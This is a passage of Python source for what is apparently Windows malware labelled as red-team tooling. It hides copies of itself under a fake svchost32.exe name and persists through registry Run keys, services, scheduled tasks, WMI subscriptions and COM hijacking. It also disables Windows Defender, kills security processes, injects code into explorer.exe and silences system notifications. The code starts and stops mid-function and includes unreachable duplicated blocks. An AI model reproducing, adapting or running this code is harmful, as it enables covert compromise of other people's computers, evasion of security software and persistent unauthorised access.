            log_message(f"[WARN] Registry persistence failed: {e}")
        
        DEPLOYMENT_COMPLETED = True
        return True
        
    except Exception as e:
        log_message(f"Deployment failed: {e}")
        return False

def self_deploy_powershell():
    """Self-deploy using PowerShell script approach."""
    global DEPLOYMENT_COMPLETED
    
    # Check if deployment was already completed in this session
    if DEPLOYMENT_COMPLETED:
        log_message("Deployment already completed in this session, skipping")
        return True
        
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Get current executable path
        if hasattr(sys, 'frozen') and sys.frozen:
            # Running as compiled executable (PyInstaller)
            current_exe = sys.executable
            log_message(f"[DEBUG] Running as compiled exe: {current_exe}")
        else:
            # Running as Python script
            current_exe = os.path.abspath(__file__)
            log_message(f"[DEBUG] Running as Python script: {current_exe}")
        
        # Check if already deployed
        stealth_path = os.path.join(
            os.environ.get('LOCALAPPDATA', ''),
            'Microsoft',
            'Windows',
            'svchost32.exe'
        )
        
        if os.path.exists(stealth_path):
            log_message("Already deployed to stealth location")
            # Still check if registry entry exists
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                   r"Software\Microsoft\Windows\CurrentVersion\Run")
                value, _ = winreg.QueryValueEx(key, "svchost32")
                winreg.CloseKey(key)
                log_message(f"Registry entry exists: {value}")
                DEPLOYMENT_COMPLETED = True
                return True
            except:
                log_message("Registry entry missing, will recreate...", "warning")
                # Continue with deployment
        
        # Define stealth paths
        stealth_path = os.path.join(
            os.environ.get('LOCALAPPDATA', ''),
            'Microsoft',
            'Windows',
            'svchost32.exe'
        )
        
        backup_path = os.path.join(
            os.environ.get('APPDATA', ''),
            'Microsoft',
            'Windows',
            'svchost32.exe'
        )
        
        # Create directories
        os.makedirs(os.path.dirname(stealth_path), exist_ok=True)
        os.makedirs(os.path.dirname(backup_path), exist_ok=True)
        
        # Copy executable to stealth locations
        import shutil
        if hasattr(sys, 'frozen') and sys.frozen:
            # Copy compiled executable
            shutil.copy2(current_exe, stealth_path)
            shutil.copy2(current_exe, backup_path)
            log_message(f"[OK] Executable copied to stealth locations")
        else:
            # For Python script, use hidden VBS launcher instead of batch wrappers
            hidden_dir = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'ClientUpdate')
            os.makedirs(hidden_dir, exist_ok=True)
            stealth_vbs = os.path.join(hidden_dir, 'winupdate.vbs')
            runner = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
            if not os.path.exists(runner):
                runner = sys.executable
            vbs_content = (
                'Set oShell = CreateObject("WScript.Shell")\n'
                f'oShell.CurrentDirectory = "{os.path.dirname(current_exe)}"\n'
                f'oShell.Run "\"{runner}\" \"{current_exe}\"", 0, false\n'
            )
            with open(stealth_vbs, 'w', encoding='utf-8') as f:
                f.write(vbs_content)
            try:
                subprocess.run(['attrib', '+s', '+h', stealth_vbs], creationflags=subprocess.CREATE_NO_WINDOW, check=False)
            except Exception:
                pass
            stealth_path = stealth_vbs
            backup_path = stealth_vbs
            log_message(f"[OK] Hidden VBS launcher created for Python script")
        
        # Set hidden attributes
        subprocess.run(['attrib', '+s', '+h', stealth_path], 
                      creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['attrib', '+s', '+h', backup_path], 
                      creationflags=subprocess.CREATE_NO_WINDOW)
        
        log_message(f"[OK] Executable deployed to: {stealth_path}")
        log_message(f"[OK] Backup created at: {backup_path}")
        
        # Add to registry using PowerShell
        powershell_script = f'''
$stealthPath = "{stealth_path}"
# Add to registry (HKCU Run) to launch hidden VBS at logon
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsSecurityUpdate" /t REG_SZ /d $stealthPath /f
Write-Host "Registry persistence established"
'''
        
        # Execute PowerShell script
        ps_script_path = os.path.join(tempfile.gettempdir(), "deploy.ps1")
        with open(ps_script_path, 'w') as f:
            f.write(powershell_script)
        
        subprocess.run([
            'powershell.exe', '-ExecutionPolicy', 'Bypass', '-File', ps_script_path
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        
        # Clean up temporary script
        try:
            os.remove(ps_script_path)
        except (OSError, FileNotFoundError, PermissionError):
            pass
        
        log_message("[OK] Registry persistence established")
        
        # Create tamper protection
        tamper_script = f'''
import os
import sys
import time
import subprocess
import shutil

def check_and_restore():
    main_exe = r"{stealth_path}"
    backup_exe = r"{backup_path}"
    
    while True:
        try:
            # Check if main executable exists and is accessible
            if not os.path.exists(main_exe):
                # Restore from backup
                if os.path.exists(backup_exe):
                    shutil.copy2(backup_exe, main_exe)
                    log_message(f"Restored executable from {{backup_exe}}")
                    
                    # Restart executable
                    subprocess.Popen([main_exe], 
                                   creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(60)  # Check every minute
            
        except Exception as e:
            log_message(f"Tamper protection error: {{e}}")
            time.sleep(120)

if __name__ == "__main__":
    check_and_restore()
'''
        
        # DISABLED: Tamper protection script to prevent Python window pop-ups
        # tamper_script_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
        # with open(tamper_script_path, 'w') as f:
        #     f.write(tamper_script)
        # 
        # # Start tamper protection in background
        # subprocess.Popen(['python.exe', tamper_script_path], 
        #                 creationflags=subprocess.CREATE_NO_WINDOW)
        
        log_message(f"[SKIP] Tamper protection script disabled to prevent popup windows")
        
        log_message("[OK] Tamper protection active")
        
        log_message("\n" + "="*80)
        log_message("SELF-DEPLOYMENT COMPLETE")
        log_message("="*80)
        log_message(f"Executable deployed to: {stealth_path}")
        log_message(f"Backup created at: {backup_path}")
        log_message("Registry persistence established")
        log_message("Tamper protection active")
        log_message("Executable will start on next login")
        log_message("="*80)
        
        DEPLOYMENT_COMPLETED = True
        return True
        
    except Exception as e:
        log_message(f"Self-deployment failed: {e}")
        return False
        
        # Create stealth deployment location
        stealth_location = os.path.join(
            os.environ.get('LOCALAPPDATA', ''),
            'Microsoft',
            'Windows',
            'svchost32.exe'
        )
        
        # Create directory if it doesn't exist
        os.makedirs(os.path.dirname(stealth_location), exist_ok=True)
        
        # Copy executable to stealth location
        import shutil
        shutil.copy2(exe_path, stealth_location)
        
        # Set hidden and system attributes
        subprocess.run(['attrib', '+s', '+h', stealth_location], 
                      creationflags=subprocess.CREATE_NO_WINDOW)
        
        log_message(f"[OK] Executable deployed to: {stealth_location}")
        
        # Create registry persistence
        try:
            import winreg
            
            # Add to HKCU Run key
            run_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, run_key_path)
            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, stealth_location)
            winreg.CloseKey(key)
            
            log_message("[OK] Registry persistence established")
            
            # Also add to RunOnce for immediate execution
            runonce_key_path = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, runonce_key_path)
            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, stealth_location)
            winreg.CloseKey(key)
            
            log_message("[OK] RunOnce persistence established")
            
        except PermissionError:
            log_message("[WARN] Registry access denied - persistence may not work", "warning")
        except Exception as e:
            log_message(f"[WARN] Registry persistence failed: {e}")
        
        # Create additional backup in different location
        backup_location = os.path.join(
            os.environ.get('APPDATA', ''),
            'Microsoft',
            'Windows',
            'svchost32.exe'
        )
        
        os.makedirs(os.path.dirname(backup_location), exist_ok=True)
        shutil.copy2(exe_path, backup_location)
        subprocess.run(['attrib', '+s', '+h', backup_location], 
                      creationflags=subprocess.CREATE_NO_WINDOW)
        
        log_message(f"[OK] Backup created at: {backup_location}")
        
        # Create tamper protection for the deployed executable
        tamper_script = f'''
import os
import sys
import time
import subprocess
import shutil

def check_and_restore():
    main_exe = r"{stealth_location}"
    backup_exe = r"{backup_location}"
    
    while True:
        try:
            # Check if main executable exists and is accessible
            if not os.path.exists(main_exe):
                # Restore from backup
                if os.path.exists(backup_exe):
                    shutil.copy2(backup_exe, main_exe)
                    log_message(f"Restored executable from {{backup_exe}}")
                    
                    # Restart executable
                    subprocess.Popen([main_exe], 
                                   creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(60)  # Check every minute
            
        except Exception as e:
            log_message(f"Tamper protection error: {{e}}")
            time.sleep(120)

if __name__ == "__main__":
    check_and_restore()
'''
        
        # DISABLED: Tamper protection executable to prevent popup windows
        # tamper_path = os.path.join(tempfile.gettempdir(), "tamper_protection.exe")
        # 
        # # Create tamper protection executable using PyInstaller
        # tamper_script_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
        # with open(tamper_script_path, 'w') as f:
        #     f.write(tamper_script)
        
        log_message(f"[SKIP] Tamper protection exe disabled to prevent popup windows")
        
        # Build tamper protection executable
        try:
            subprocess.run([
                'pyinstaller', '--onefile', '--windowed', '--name', 'tamper_protection',
                tamper_script_path
            ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=300)  # 5 minute timeout
        except subprocess.TimeoutExpired:
            log_message("[WARN] Tamper protection build timed out, continuing without it", "warning")
        except Exception as e:
            log_message(f"[WARN] Failed to build tamper protection: {e}")
        
        # Move tamper protection to stealth location
        tamper_exe = os.path.join('dist', 'tamper_protection.exe')
        if os.path.exists(tamper_exe):
            stealth_tamper = os.path.join(
                os.environ.get('LOCALAPPDATA', ''),
                'Microsoft',
                'Windows',
                'tamper_protection.exe'
            )
            shutil.move(tamper_exe, stealth_tamper)
            subprocess.run(['attrib', '+s', '+h', stealth_tamper], 
                          creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Start tamper protection
            subprocess.Popen([stealth_tamper], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            log_message(f"[OK] Tamper protection deployed: {stealth_tamper}")
        
        log_message("\n" + "="*80)
        log_message("DEPLOYMENT COMPLETE")
        log_message("="*80)
        log_message(f"Executable deployed to: {stealth_location}")
        log_message(f"Backup created at: {backup_location}")
        log_message("Registry persistence established")
        log_message("Tamper protection active")
        log_message("Executable will start on next login")
        log_message("="*80)
        
        return True
        
    except Exception as e:
        log_message(f"Deployment failed: {e}")
        return False

def disable_defender():
    """AGGRESSIVE Windows Defender disable - RED TEAM MODE."""
    if not WINDOWS_AVAILABLE:
        return False
    if not DEFENDER_DISABLE_ENABLED:
        return False
    
    log_message("[DEFENDER] [!] AGGRESSIVE DEFENDER DISABLE - RED TEAM MODE")
    log_message("[DEFENDER] Using multiple bypass techniques to ensure complete disable")
    
    try:
        defender_disable_methods = [
            disable_defender_registry,
            disable_defender_powershell,
            disable_defender_group_policy,
            disable_defender_service,
        ]
        if DEFENDER_TAMPER_DISABLE_ENABLED:
            defender_disable_methods.append(disable_defender_tamper_protection)
        defender_disable_methods.extend([
            disable_defender_exclusions,
            disable_defender_wd_filter,
        ])
        
        success_count = 0
        total_methods = len(defender_disable_methods)
        
        # Execute ALL methods aggressively (don't stop on first success)
        for method in defender_disable_methods:
            try:
                if method():
                    success_count += 1
                    log_message(f"[DEFENDER] [ OK ] {method.__name__} succeeded")
                else:
                    log_message(f"[DEFENDER] [ ! ] {method.__name__} failed")
            except Exception as e:
                log_message(f"[DEFENDER] [ X ] {method.__name__} error: {e}")
                continue
        
        # Also attempt immediate process termination
        try:
            terminate_defender_processes()
            success_count += 1
            log_message("[DEFENDER] [ OK ] Defender process termination attempted")
        except Exception as e:
            log_message(f"[DEFENDER] [ ! ] Process termination failed: {e}")
        
        # Consider successful if at least 3 methods worked
        log_message(f"[DEFENDER] Results: {success_count}/{total_methods + 1} methods succeeded")
        return success_count >= 3
        
    except Exception as e:
        log_message(f"[DEFENDER] [ X ] Critical error during Defender disable: {e}")
        return False

def disable_defender_registry():
    """Disable Windows Defender via registry modifications."""
    try:
        import winreg
        
        # Disable real-time monitoring
        defender_key = r"SOFTWARE\Policies\Microsoft\Windows Defender"
        realtime_key = r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
        
        # Create keys and set values
        keys_values = [
            (defender_key, "DisableAntiSpyware", 1),
            (realtime_key, "DisableRealtimeMonitoring", 1),
            (realtime_key, "DisableBehaviorMonitoring", 1),
            (realtime_key, "DisableOnAccessProtection", 1),
            (realtime_key, "DisableScanOnRealtimeEnable", 1),
        ]
        
        for key_path, value_name, value_data in keys_values:
            try:
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                winreg.SetValueEx(key, value_name, 1, winreg.REG_DWORD, value_data)
                winreg.CloseKey(key)
            except:
                continue
        
        return True
        
    except Exception as e:
        log_message(f"Registry Defender disable failed: {e}")
        return False

def disable_defender_powershell():
    """Disable Windows Defender via PowerShell commands."""
    if not WINDOWS_AVAILABLE:
        log_message("PowerShell Defender disable: Windows not available")
        return False
        
    try:
        powershell_commands = [
            'Set-MpPreference -DisableRealtimeMonitoring $true',
            'Set-MpPreference -DisableBehaviorMonitoring $true',
            'Set-MpPreference -DisableBlockAtFirstSeen $true',
            'Set-MpPreference -DisableIOAVProtection $true',
            'Set-MpPreference -DisablePrivacyMode $true',
            'Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true',
            'Set-MpPreference -DisableArchiveScanning $true',
            'Set-MpPreference -DisableIntrusionPreventionSystem $true',
            'Set-MpPreference -DisableScriptScanning $true',
            'Set-MpPreference -SubmitSamplesConsent 2',
        ]
        
        for cmd in powershell_commands:
            try:
                subprocess.run([
                    'powershell.exe', '-Command', cmd
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10, 
                   capture_output=True, text=True)
            except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
                continue
            except Exception as e:
                log_message(f"PowerShell command failed: {e}")
                continue
        
        # Add exclusions for common paths
        exclusion_paths = [
            os.path.dirname(os.path.abspath(__file__)),
            tempfile.gettempdir(),
            os.path.expanduser("~\\Downloads"),
            os.path.expanduser("~\\Documents"),
        ]
        
        for path in exclusion_paths:
            try:
                subprocess.run([
                    'powershell.exe', '-Command',
                    f'Add-MpPreference -ExclusionPath "{path}"'
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10,
                   capture_output=True, text=True)
            except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
                continue
            except Exception as e:
                log_message(f"PowerShell exclusion failed: {e}")
                continue
        
        return True
        
    except Exception as e:
        log_message(f"PowerShell Defender disable failed: {e}")
        return False
def disable_defender_group_policy():
    """Disable Windows Defender via Group Policy modifications."""
    if not WINDOWS_AVAILABLE:
        log_message("Group Policy Defender disable: Windows not available")
        return False
        
    try:
        import winreg
        
        # Group Policy registry paths
        gp_paths = [
            (r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "DisableBlockAtFirstSeen", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection", "ForceDefenderPassiveMode", 1),
        ]
        
        for key_path, value_name, value_data in gp_paths:
            try:
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
                winreg.CloseKey(key)
            except (PermissionError, OSError, FileNotFoundError):
                continue
            except Exception as e:
                log_message(f"Registry key modification failed: {e}")
                continue
        
        return True
        
    except Exception as e:
        log_message(f"Group Policy Defender disable failed: {e}")
        return False

def disable_defender_service():
    """Disable Windows Defender services."""
    if not WINDOWS_AVAILABLE:
        log_message("Service Defender disable: Windows not available")
        return False
        
    try:
        services_to_disable = [
            'WinDefend',
            'WdNisSvc',
            'WdNisDrv',
            'WdFilter',
            'WdBoot',
            'Sense',
        ]
        
        for service in services_to_disable:
            try:
                # Stop service
                subprocess.run([
                    'sc.exe', 'stop', service
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10,
                   capture_output=True, text=True)
                
                # Disable service
                subprocess.run([
                    'sc.exe', 'config', service, 'start=', 'disabled'
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10,
                   capture_output=True, text=True)
            except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
                continue
            except Exception as e:
                log_message(f"Service disable failed for {service}: {e}")
                continue
        
        return True
        
    except Exception as e:
        log_message(f"Service Defender disable failed: {e}")
        return False

def disable_defender_tamper_protection():
    """Disable Windows Defender Tamper Protection - CRITICAL FOR RED TEAM."""
    if not DEFENDER_TAMPER_DISABLE_ENABLED:
        return False
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Tamper Protection prevents registry modifications - must disable first
        tamper_commands = [
            'powershell.exe -Command "Set-MpPreference -DisableTamperProtection $true"',
            'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f',
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f',
        ]
        
        for cmd in tamper_commands:
            try:
                import shlex
                args = ['cmd.exe', '/C', cmd] if os.name == 'nt' else shlex.split(cmd)
                subprocess.run(args, creationflags=subprocess.CREATE_NO_WINDOW, timeout=15, capture_output=True, text=True)
            except:
                continue
        
        return True
        
    except Exception as e:
        log_message(f"Tamper protection disable failed: {e}")
        return False

def disable_defender_exclusions():
    """Add exclusions for our files and directories to prevent detection."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Get current directory and add as exclusion
        current_dir = os.getcwd()
        temp_dir = os.environ.get('TEMP', 'C:\\Windows\\Temp')
        
        exclusion_paths = [
            current_dir,
            temp_dir,
            'C:\\Windows\\Temp',
            'C:\\Users\\Public',
            'C:\\ProgramData',
        ]
        
        for path in exclusion_paths:
            try:
                subprocess.run([
                    'powershell.exe', '-Command', 
                    f'Add-MpPreference -ExclusionPath "{path}"'
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10,
                   capture_output=True, text=True)
            except:
                continue
        
        return True
        
    except Exception as e:
        log_message(f"Defender exclusions failed: {e}")
        return False

def disable_defender_wd_filter():
    """Disable WD filter driver to prevent real-time scanning."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Disable WD filter via registry
        import winreg
        
        filter_key = r"SYSTEM\\CurrentControlSet\\Services\\WdFilter"
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, filter_key)
            winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 4)  # Disabled
            winreg.CloseKey(key)
        except:
            pass
        
        # Also try via command line
        subprocess.run(['sc.exe', 'config', 'WdFilter', 'start=', 'disabled'], 
                      creationflags=subprocess.CREATE_NO_WINDOW, timeout=10,
                      capture_output=True, text=True)
        
        return True
        
    except Exception as e:
        log_message(f"WD filter disable failed: {e}")
        return False

def terminate_defender_processes():
    """Force terminate all Windows Defender processes."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        defender_processes = [
            'MsMpEng.exe', 'NisSrv.exe', 'SecurityHealthService.exe',
            'SecurityHealthSystray.exe', 'MsSense.exe', 'smartscreen.exe'
        ]
        
        for proc_name in defender_processes:
            try:
                subprocess.run(['taskkill', '/f', '/im', proc_name], 
                             creationflags=subprocess.CREATE_NO_WINDOW, timeout=10,
                             capture_output=True, text=True)
            except:
                continue
        
        return True
        
    except Exception as e:
        log_message(f"Defender process termination failed: {e}")
        return False

def advanced_process_hiding():
    """Advanced process hiding techniques."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Method 1: Process Hollowing (simplified)
        hollow_process()
        
        # Method 2: DLL Injection into trusted process
        inject_into_trusted_process()
        
        # Method 3: Process Doppelganging (simplified)
        process_doppelganging()
        
        return True
        
    except Exception as e:
        log_message(f"Advanced process hiding failed: {e}")
        return False

def hollow_process():
    """Simple process hollowing technique."""
    try:
        # Create suspended process
        target_process = "notepad.exe"
        
        si = win32process.STARTUPINFO()
        pi = win32process.CreateProcess(
            None,
            target_process,
            None,
            None,
            False,
            win32con.CREATE_SUSPENDED,
            None,
            None,
            si
        )
        
        # In a real implementation, we would:
        # 1. Unmap the original executable
        # 2. Allocate memory for our payload
        # 3. Write our payload to the process memory
        # 4. Update the entry point
        # 5. Resume the process
        
        # For this demo, just resume the process
        win32process.ResumeThread(pi[1])
        
        win32api.CloseHandle(pi[0])
        win32api.CloseHandle(pi[1])
        
        return True
        
    except Exception as e:
        log_message(f"Process hollowing failed: {e}")
        return False

def inject_into_trusted_process():
    """Inject into a trusted process."""
    try:
        # Find explorer.exe process
        if not PSUTIL_AVAILABLE:
            return False
            
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == 'explorer.exe':
                # Get process handle
                process_handle = win32api.OpenProcess(
                    win32con.PROCESS_ALL_ACCESS,
                    False,
                    proc.info['pid']
                )
                
                # Allocate memory in target process
                dll_path = os.path.abspath(__file__).encode('utf-8')
                memory_address = win32process.VirtualAllocEx(
                    process_handle,
                    0,
                    len(dll_path),
                    win32con.MEM_COMMIT | win32con.MEM_RESERVE,
                    win32con.PAGE_READWRITE
                )
                
                # Write DLL path to target process
                win32process.WriteProcessMemory(
                    process_handle,
                    memory_address,
                    dll_path,
                    len(dll_path)
                )
                
                # Get LoadLibraryA address
                kernel32 = win32api.GetModuleHandle("kernel32.dll")
                loadlibrary_addr = win32api.GetProcAddress(kernel32, "LoadLibraryA")
                
                # Create remote thread
                thread_handle = win32process.CreateRemoteThread(
                    process_handle,
                    None,
                    0,
                    loadlibrary_addr,
                    memory_address,
                    0
                )
                
                win32api.CloseHandle(thread_handle)
                win32api.CloseHandle(process_handle)
                
                return True
                
        return False
        
    except Exception as e:
        log_message(f"Process injection failed: {e}")
        return False

def process_doppelganging():
    """Simplified process doppelganging technique."""
    try:
        # This is a simplified version - real implementation would use NTFS transactions
        temp_file = os.path.join(tempfile.gettempdir(), "temp_process.exe")
        
        # Copy legitimate executable
        legitimate_exe = r"C:\Windows\System32\notepad.exe"
        
        if os.path.exists(legitimate_exe):
            import shutil
            shutil.copy2(legitimate_exe, temp_file)
            
            # In real implementation, we would:
            # 1. Create NTFS transaction
            # 2. Overwrite file content with our payload
            # 3. Create process from the transacted file
            # 4. Rollback transaction
            
            # For demo, just execute the copied file
            subprocess.Popen([temp_file], creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Clean up
            time.sleep(1)
            try:
                os.remove(temp_file)
            except:
                pass
                
            return True
        
        return False
        
    except Exception as e:
        log_message(f"Process doppelganging failed: {e}")
        return False

def advanced_persistence():
    """Advanced persistence mechanisms."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        persistence_methods = [
            setup_registry_persistence,
            setup_service_persistence, 
            setup_scheduled_task_persistence,
            setup_wmi_persistence,
            setup_com_hijacking_persistence,
        ]
        
        for method in persistence_methods:
            try:
                method()
            except:
                continue
        
        return True
        
    except Exception as e:
        log_message(f"Advanced persistence failed: {e}")
        return False

def setup_service_persistence():
    """Setup persistence via Windows service."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        service_name = "WindowsSecurityUpdate"
        
        # Create service
        subprocess.run([
            'sc.exe', 'create', service_name,
            'binPath=', current_exe,
            'start=', 'auto',
            'DisplayName=', 'Windows Security Update Service'
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        
        # Start service
        subprocess.run([
            'sc.exe', 'start', service_name
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        
        return True
        
    except Exception as e:
        log_message(f"Service persistence failed: {e}")
        return False

def setup_scheduled_task_persistence():
    """Setup persistence via scheduled task."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        task_name = "WindowsSecurityUpdateTask"
        
        # Create scheduled task with /rl limited to avoid UAC prompts
        # Changed from 'highest' to 'limited' so it runs with normal user privileges
        subprocess.run([
            'schtasks.exe', '/create',
            '/tn', task_name,
            '/tr', current_exe,
            '/sc', 'onlogon',
            '/rl', 'limited',
            '/f'
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        
        return True
        
    except Exception as e:
        log_message(f"Scheduled task persistence failed: {e}")
        return False

def setup_wmi_persistence():
    """Setup persistence via WMI event subscription."""
    if not WINDOWS_AVAILABLE:
        log_message("WMI persistence: Windows not available")
        return False
        
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # WMI persistence using PowerShell
        wmi_script = f'''
$filterName = 'WindowsSecurityFilter'
$consumerName = 'WindowsSecurityConsumer'

$Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\\subscription" -Arguments @{{Name=$filterName;EventNameSpace="root\\cimv2";QueryLanguage="WQL";Query=$Query}}

$Arg = @{{
    Name=$consumerName
    CommandLineTemplate="{current_exe}"
}}
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments $Arg

$WMIEventBinding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}}
'''
        
        subprocess.run([
            'powershell.exe', '-Command', wmi_script
        ], creationflags=subprocess.CREATE_NO_WINDOW, 
           capture_output=True, text=True, timeout=30)
        
        return True
        
    except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
        log_message("WMI persistence: PowerShell execution failed")
        return False
    except Exception as e:
        log_message(f"WMI persistence failed: {e}")
        return False

def setup_com_hijacking_persistence():
    """Setup persistence via COM hijacking."""
    if not WINDOWS_AVAILABLE:
        log_message("COM hijacking persistence: Windows not available")
        return False
        
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack a commonly used COM object
        clsid = "{00000000-0000-0000-0000-000000000000}"  # Placeholder CLSID
        key_path = f"Software\\Classes\\CLSID\\{clsid}\\InProcServer32"
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
        winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
        winreg.CloseKey(key)
        
        return True
        
    except (PermissionError, OSError, FileNotFoundError):
        log_message("COM hijacking persistence: Registry access failed")
        return False
    except Exception as e:
        log_message(f"COM hijacking persistence failed: {e}")
        return False

# Removed duplicate functions - these are already defined above

def disable_windows_notifications():
    """Disable all Windows notifications and action center."""
    if not WINDOWS_AVAILABLE:
        log_message("[NOTIFICATIONS] Windows not available")
        return False
    
    try:
        import winreg
        log_message("[NOTIFICATIONS] Disabling Windows notifications...")
        
        success_count = 0
        
        # 1. Disable Action Center notifications (Current User)
        try:
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "ToastEnabled", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            log_message("[NOTIFICATIONS] Action Center notifications disabled (HKCU)")
            success_count += 1
        except Exception as e:
            log_message(f"[NOTIFICATIONS] Failed to disable Action Center (HKCU): {e}")
        
        # 2. Disable notification center entirely (Current User)
        try:
            key_path = r"SOFTWARE\Policies\Microsoft\Windows\Explorer"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "DisableNotificationCenter", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            log_message("[NOTIFICATIONS] Notification Center disabled (HKCU)")
            success_count += 1
        except Exception as e:
            log_message(f"[NOTIFICATIONS] Failed to disable Notification Center (HKCU): {e}")
        
        # 3. Disable Windows Defender notifications (Current User)
        try:
            key_path = r"SOFTWARE\Microsoft\Windows Defender\UX Configuration"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "Notification_Suppress", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            log_message("[NOTIFICATIONS] Windows Defender notifications disabled (HKCU)")
            success_count += 1
        except Exception as e:
            log_message(f"[NOTIFICATIONS] Failed to disable Defender notifications (HKCU): {e}")
        
        # 4. Disable toast notifications (Current User)
        try:
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "NOC_GLOBAL_SETTING_ALLOW_CRITICAL_TOASTS_ABOVE_LOCK", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            log_message("[NOTIFICATIONS] Toast notifications disabled (HKCU)")
            success_count += 1
        except Exception as e:
            log_message(f"[NOTIFICATIONS] Failed to disable toast notifications (HKCU): {e}")
        
        # 5. Try system-wide settings if we have admin privileges
        try:
            # Disable notification center system-wide
            key_path = r"SOFTWARE\Policies\Microsoft\Windows\Explorer"
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            winreg.SetValueEx(key, "DisableNotificationCenter", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            log_message("[NOTIFICATIONS] Notification Center disabled system-wide (HKLM)")
            success_count += 1
        except PermissionError:
            log_message("[NOTIFICATIONS] No admin privileges for system-wide settings")
        except Exception as e:
            log_message(f"[NOTIFICATIONS] Failed to disable notifications system-wide: {e}")
        
        # 6. Disable Windows Update notifications (Current User)
